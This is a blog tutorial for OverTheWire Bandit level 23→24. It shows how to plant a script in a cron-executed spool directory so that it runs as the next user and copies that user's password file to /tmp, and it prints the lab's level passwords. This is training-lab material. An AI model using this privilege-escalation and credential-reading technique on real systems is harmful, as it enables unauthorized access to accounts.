---
date: 2023-01-26 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Bandit Level 23 → 24 tutorial!!"
permalink: /posts/overTheWire-Bandit-Level-23-to-24/
tags: [overthewire, bandit, walkthrough, ctf, linux, beginner]
description: "A step by step tutorial for OverTheWire Bandit Level 23 → 24!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Bandit level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Bandit-Level-22-to-23/' | relative_url }}">← Previous: Level 22 → 23</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/bandit/bandit24.html" target="_blank" rel="noopener">Official (Level 24) ↗</a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Bandit-Level-24-to-25/' | relative_url }}">Next: Level 24 → 25 →</a>
  </div>
</nav>

## Login

Log in as **bandit23** using the password you obtained from Level 22 → 23.

```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
# password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
````

> Why? Each Bandit level is a separate UNIX user. To solve 23 → 24, you must be the `bandit23` user.

## Task

![Task]({{ '/assets/images/bandit/level-23-to-24/task.jpg' | relative_url }})

A **cron job** runs as **`bandit24`**. Read its config and script. If it executes files from a writable directory, drop a tiny script there that prints the **password for `bandit24`** to a place you can read.

## A little bit of Theory

* Cron entries live in **`/etc/cron.d/`** and point to scripts/binaries.
* In this level, the script iterates a **spool folder** and executes every file it finds, then deletes it.
* Your payload executes **as `bandit24`**, so it can `cat /etc/bandit_pass/bandit24` for you.

**Further reading:**

* <a href="https://man7.org/linux/man-pages/man5/crontab.5.html" target="_blank" rel="noopener">`crontab(5)` format</a>
* <a href="https://man7.org/linux/man-pages/man8/cron.8.html" target="_blank" rel="noopener">`cron(8)` format</a>
* <a href="https://en.wikipedia.org/wiki/Shell_script" target="_blank" rel="noopener">Shell scripts (Wikipedia)</a>

## Solution

1. **List cron definitions**

   ```bash
   ls -l /etc/cron.d
   ```

   *Why?* Find the file for this level: **`cronjob_bandit24`**.

   ![cron dir]({{ '/assets/images/bandit/level-23-to-24/cron-dir.jpg' | relative_url }})

2. **Read the cron file**

   ```bash
   cat /etc/cron.d/cronjob_bandit24
   ```

   You should see it runs **as `bandit24`** and calls `/usr/bin/cronjob_bandit24.sh` every minute.

   ![cron file]({{ '/assets/images/bandit/level-23-to-24/cron-file.jpg' | relative_url }})

3. **Open the referenced script (note the spool path & owner check)**

   ```bash
   cat /usr/bin/cronjob_bandit24.sh
   ```

   In my run it shows (abridged):

   ```bash
   myname=$(whoami)                     # bandit24
   cd /var/spool/$myname/foo
   for i in * .*; do
     if [ "$i" != "." -a "$i" != ".." ]; then
       owner="$(stat --format "%U" ./$i)"
       if [ "${owner}" = "bandit23" ]; then
         timeout -s 9 60 ./$i
       fi
       rm -f ./$i
     fi
   done
   ```

   *Why?* Payloads must be placed in **`/var/spool/bandit24/foo`** and be **owned by `bandit23`** (which happens automatically if you copy them as bandit23).

   ![script]({{ '/assets/images/bandit/level-23-to-24/script.jpg' | relative_url }})

4. **Create a payload that writes the password to `/tmp`**

   ```bash
   WORKDIR=$(mktemp -d)
   cat > "$WORKDIR/getpass.sh" << 'EOF'
   ```

    ```
    \#!/bin/bash
    cat /etc/bandit\_pass/bandit24 > /tmp/b24\_pass.txt
    chmod 644 /tmp/b24\_pass.txt
    EOF
    chmod +x "\$WORKDIR/getpass.sh"

    ```

    *Why?* Simple, robust, world-readable output.

5. **Drop the payload into the spool directory (the `foo` subdir!)**

    ```bash
    SPOOL="/var/spool/bandit24/foo"
    ls -ld "$SPOOL"            # sanity-check
    cp "$WORKDIR/getpass.sh" "$SPOOL/"
    ````

    *Why?* The cron will pick it up within a minute, execute it as `bandit24`, then remove it.

    ![cat]({{ '/assets/images/bandit/level-23-to-24/cat.jpg' | relative_url }})

6. **Read the password produced by the payload**

   ```bash
   cat /tmp/b24_pass.txt
   ```

   *Why?* That file contains the **password for `bandit24`**.

   ![read]({{ '/assets/images/bandit/level-23-to-24/pass.jpg' | relative_url }})

7. **Log in to the next level (bandit24)**

   ```bash
   exit
   ssh bandit24@bandit.labs.overthewire.org -p 2220
   # paste the password from /tmp/b24_pass.txt
   ```

## Password

> This is the password shown in my run; copy the one from your terminal if it differs.

```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

**Troubleshooting**

* **Wrong directory** → Use **`/var/spool/bandit24/foo`**, not just `/var/spool/bandit24`.
* **Not executed** → Ensure the file is **regular** and **executable** (`chmod +x`), and that **owner = bandit23** (automatic when you copy as bandit23).
* **No output / file missing** → Wait up to 60s; cron deletes payloads after running. Choose a unique output filename in `/tmp` if needed.
* **Timeout** → The script uses `timeout 60`. Keep your payload tiny and fast.

---

## Copy-paste quick run (one shot)

```bash
# Inspect cron & script
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh

# Drop payload into the correct spool subdir
SPOOL=/var/spool/bandit24/foo
WORKDIR=$(mktemp -d)
cat > "$WORKDIR/getpass.sh" << 'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/b24_pass.txt
chmod 644 /tmp/b24_pass.txt
EOF
chmod +x "$WORKDIR/getpass.sh"
cp "$WORKDIR/getpass.sh" "$SPOOL/"

# After ≤60s:
cat /tmp/b24_pass.txt
```

---

**Congrats 🎉** You abused a cron-executed spool to run your own code as the next user — welcome to **bandit24**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

